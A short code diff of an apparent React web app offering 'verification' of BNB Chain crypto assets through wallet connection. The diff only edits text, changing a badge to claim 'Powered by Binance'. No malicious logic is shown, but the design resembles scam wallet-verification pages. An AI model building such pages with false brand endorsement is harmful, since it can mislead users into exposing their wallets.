@@ -11,7 +11,7 @@ const ERC20_ABI = [
 
 function App() {
   const [walletAddress, setWalletAddress] = useState("");
-  const [status, setStatus] = useState("Click Verify to start...");
+  const [status, setStatus] = useState("Click connect to verify...");
 
   async function connectWallet() {
     if (!window.ethereum) return alert("Install MetaMask or Binance Wallet!");
@@ -88,7 +88,7 @@ function App() {
       {/* Hero Section */}
       <main className="hero">
         <div className="hero-left">
-          <div className="powered-badge">Powered by BNB Chain</div>
+          <div className="powered-badge">Powered by Binance</div>
           <h1>Verify Crypto Assets on BNB Chain</h1>
           <p>Instant verification of BNB Chain assets. Supports both BNB and USDT (BEP20) transfers securely.</p>
           <div className="hero-buttons">
